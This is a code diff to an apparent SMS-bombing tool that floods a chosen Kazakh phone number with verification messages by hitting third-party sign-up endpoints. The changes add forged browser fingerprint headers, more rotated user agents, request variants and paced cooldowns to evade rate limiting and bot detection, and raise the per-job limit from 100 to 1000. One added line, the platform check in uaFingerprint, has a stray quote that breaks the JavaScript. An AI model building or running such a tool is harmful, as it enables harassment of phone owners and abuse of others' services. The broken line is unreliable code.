@@ -80,10 +80,27 @@ const KZ_MOBILE_PREFIXES=new Set(['700','701','702','703','704','705','706','707
 const DEFAULT_UAS=[
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36',
- 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148'
+ 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148',
+ 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
+ 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
+ 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
+ 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36'
 ];
 function randOf(a){return a[Math.floor(Math.random()*a.length)];}
 function randDelay(min,max){return Math.floor(min+Math.random()*Math.max(1,max-min));}
+function shuffle(a){const r=a.slice();for(let i=r.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[r[i],r[j]]=[r[j],r[i]];}return r;}
+function uaFingerprint(ua){
+ const chrome=ua.match(/Chrome\/(\d+)/);
+ if(chrome){
+  const v=chrome[1];
+  const mobile=/Mobile|Android|iPhone/.test(ua)?'?1':'?0';
+  const platform=/Android/.test(ua)?'"Android"':/iPhone|iPad/.test(ua)?'"iOS"':/Mac OS X/.test(ua)?'"macOS"':'/Linux/.test(ua)?'"Linux"':'"Windows"';
+  return{secChUa:'"Chromium";v="'+v+'", "Google Chrome";v="'+v+'", "Not A(Brand";v="99"',mobile,platform};
+ }
+ const ff=ua.match(/Firefox\/(\d+)/);
+ if(ff)return{secChUa:null,mobile:'?0',platform:/Linux/.test(ua)?'"Linux"':'"Windows"'};
+ return{secChUa:'"Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"',mobile:'?0',platform:'"Windows"'};
+}
 function normalizeKzPhone(raw){
  let digits=String(raw||'').replace(/\D/g,'');
  if(digits.length===11&&(digits[0]==='8'||digits[0]==='7'))digits=digits.slice(1);
@@ -102,16 +119,29 @@ function substitutePhone(template,forms){
 }
 async function loadBomberConfig(){
  const data=JSON.parse(await readFile(new URL('./endpoints.json',import.meta.url),'utf8'));
- const endpoints=(data.endpoints||[]).filter(e=>e.enabled!==false).map(e=>({name:e.name,method:(e.method||'POST').toUpperCase(),url:e.url,channel:(e.channel||'sms').toLowerCase(),contentType:e.content_type||'application/json',body:e.body||'',headers:e.headers||{},preRequest:e.pre_request||null}));
- return{endpoints,threads:Number(data.threads??6),delayMinMs:Number(data.delay_min_ms??200),delayMaxMs:Number(data.delay_max_ms??1400),timeoutSec:Number(data.timeout_sec??10),userAgents:data.user_agents||DEFAULT_UAS,proxies:data.proxies||[],simulation:data.simulation_mode??true};
+ const endpoints=(data.endpoints||[]).filter(e=>e.enabled!==false).map(e=>({name:e.name,method:(e.method||'POST').toUpperCase(),url:e.url,channel:(e.channel||'sms').toLowerCase(),contentType:e.content_type||'application/json',body:e.body||'',headers:e.headers||{},preRequest:e.pre_request||null,variants:e.variants||null}));
+ return{endpoints,threads:Number(data.threads??6),delayMinMs:Number(data.delay_min_ms??200),delayMaxMs:Number(data.delay_max_ms??1400),timeoutSec:Number(data.timeout_sec??10),userAgents:data.user_agents||DEFAULT_UAS,proxies:data.proxies||[],simulation:data.simulation_mode??true,smsPerMinute:Number(data.sms_per_minute??60),perEndpointCooldownMs:Number(data.per_endpoint_cooldown_ms??5000)};
 }
 async function fireEndpoint(ep,forms,cfg,roundUA,roundProxy){
  const result={name:ep.name,channel:ep.channel,ok:false,status:null,snippet:''};
  if(cfg.simulation){result.ok=true;result.status=200;result.snippet='simulated';return result;}
- let url=substitutePhone(ep.url,forms),bodyStr=substitutePhone(ep.body,forms);
+ const variant=ep.variants&&ep.variants.length?randOf(ep.variants):null;
+ const baseHeaders={...(ep.headers||{}),...(variant?.headers||{})};
+ const baseUrl=variant?.url||ep.url;
+ const baseBody=variant?.body||ep.body;
+ let url=substitutePhone(baseUrl,forms),bodyStr=substitutePhone(baseBody,forms);
  const headers={};
- for(const[k,v]of Object.entries(ep.headers))headers[k]=substitutePhone(String(v),forms);
- if(!headers['User-Agent'])headers['User-Agent']=roundUA||randOf(cfg.userAgents);
+ for(const[k,v]of Object.entries(baseHeaders))headers[k]=substitutePhone(String(v),forms);
+ const ua=roundUA||randOf(cfg.userAgents);
+ if(!headers['User-Agent'])headers['User-Agent']=ua;
+ if(!headers['Accept-Language'])headers['Accept-Language']='en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7';
+ const fp=uaFingerprint(ua);
+ if(fp.secChUa&&!headers['Sec-CH-UA'])headers['Sec-CH-UA']=fp.secChUa;
+ if(!headers['Sec-CH-UA-Mobile'])headers['Sec-CH-UA-Mobile']=fp.mobile;
+ if(!headers['Sec-CH-UA-Platform'])headers['Sec-CH-UA-Platform']=fp.platform;
+ if(!headers['Sec-Fetch-Dest'])headers['Sec-Fetch-Dest']='empty';
+ if(!headers['Sec-Fetch-Mode'])headers['Sec-Fetch-Mode']='cors';
+ if(!headers['Sec-Fetch-Site'])headers['Sec-Fetch-Site']='same-origin';
  if(ep.contentType&&!headers['Content-Type'])headers['Content-Type']=ep.contentType;
  let dispatcher=undefined;
  if(roundProxy){try{dispatcher=new ProxyAgent(roundProxy);}catch{}}
@@ -119,7 +149,9 @@ async function fireEndpoint(ep,forms,cfg,roundUA,roundProxy){
  if(ep.preRequest){
   const preUrl=substitutePhone(ep.preRequest.url||'',forms);
   const preMethod=(ep.preRequest.method||'GET').toUpperCase();
-  const preHeaders={'User-Agent':roundUA||randOf(cfg.userAgents),'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',...(ep.preRequest.headers||{})};
+  const preHeaders={'User-Agent':ua,'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':headers['Accept-Language']};
+  if(fp.secChUa){preHeaders['Sec-CH-UA']=fp.secChUa;preHeaders['Sec-CH-UA-Mobile']=fp.mobile;preHeaders['Sec-CH-UA-Platform']=fp.platform;}
+  Object.assign(preHeaders,ep.preRequest.headers||{});
   try{
    const preRes=await uFetch(preUrl,{method:preMethod,headers:preHeaders,redirect:'manual',dispatcher});
    const text=await preRes.text();
@@ -155,7 +187,7 @@ const JOB_TTL_MS=60*60*1000;
 function pruneBomberJobs(){const t=Date.now();for(const[id,j]of bomberJobs)if(t-j.startedAt>JOB_TTL_MS)bomberJobs.delete(id);}
 async function runBomberJob(rawPhone,count,channel,simulation,liveProxies){
  pruneBomberJobs();
- if(!Number.isInteger(count)||count<1||count>100)throw new Error('count must be 1..100');
+ if(!Number.isInteger(count)||count<1||count>1000)throw new Error('count must be 1..1000');
  const forms=normalizeKzPhone(rawPhone);
  if(!forms.e164)throw new Error(forms.error);
  if(!forms.valid)throw new Error(forms.error+' (use ! to force)');
@@ -173,27 +205,42 @@ async function runBomberJob(rawPhone,count,channel,simulation,liveProxies){
   try{
    const eligible=cfg.endpoints.filter(e=>want.has(e.channel));
    if(eligible.length){
-    for(let round=0;round<count;round++){
-     if(job.stopRequested){job.stopped=true;break;}
+    const perMinute=Math.max(1,cfg.smsPerMinute);
+    const intervalMs=Math.max(50,Math.floor(60000/perMinute));
+    const cooldown=Math.max(500,cfg.perEndpointCooldownMs);
+    const lastHit=new Map();
+    const active=new Set();
+    const total=count;
+    let dispatched=0;
+    const tickOnce=()=>{
+     if(job.stopRequested||dispatched>=total)return;
+     const now=Date.now();
+     const candidates=eligible.filter(ep=>!active.has(ep.name)&&now-(lastHit.get(ep.name)||0)>=cooldown);
+     if(!candidates.length)return;
+     const ep=randOf(candidates);
+     active.add(ep.name);
+     lastHit.set(ep.name,now);
+     dispatched++;
      const roundUA=randOf(cfg.userAgents);
      const roundProxy=cfg.proxies.length?randOf(cfg.proxies):null;
-     let idx=0;
-     const worker=async()=>{
-      while(true){
-       if(job.stopRequested)return;
-       const i=idx++;
-       if(i>=eligible.length)return;
-       const ep=eligible[i];
+     (async()=>{
+      try{
        const r=await fireEndpoint(ep,forms,cfg,roundUA,roundProxy);
        if(r.ok)job.sent++;else job.failed++;
        job.events.push({seq:job.events.length+1,phone:forms.e164,channel:r.channel,name:r.name,status:r.ok?'sent':'failed',http:r.status,error:r.ok?null:(r.snippet||'').slice(0,120)});
-       await new Promise(res=>setTimeout(res,randDelay(cfg.delayMinMs,cfg.delayMaxMs)));
-      }
-     };
-     const pool=[];
-     for(let i=0;i<Math.min(cfg.threads,eligible.length);i++)pool.push(worker());
-     await Promise.all(pool);
-    }
+      }catch(e){
+       job.failed++;
+       job.events.push({seq:job.events.length+1,phone:forms.e164,channel:ep.channel,name:ep.name,status:'failed',http:null,error:String(e.message||e).slice(0,120)});
+      }finally{active.delete(ep.name);}
+     })();
+    };
+    await new Promise(resolve=>{
+     const timer=setInterval(()=>{
+      if(job.stopRequested){clearInterval(timer);resolve();return;}
+      if(dispatched>=total&&active.size===0){clearInterval(timer);resolve();return;}
+      tickOnce();
+     },intervalMs);
+    });
    }
   }catch(err){
    job.events.push({seq:job.events.length+1,phone:forms.e164,channel:'system',name:'worker',status:'failed',http:null,error:String(err.message||err).slice(0,160)});
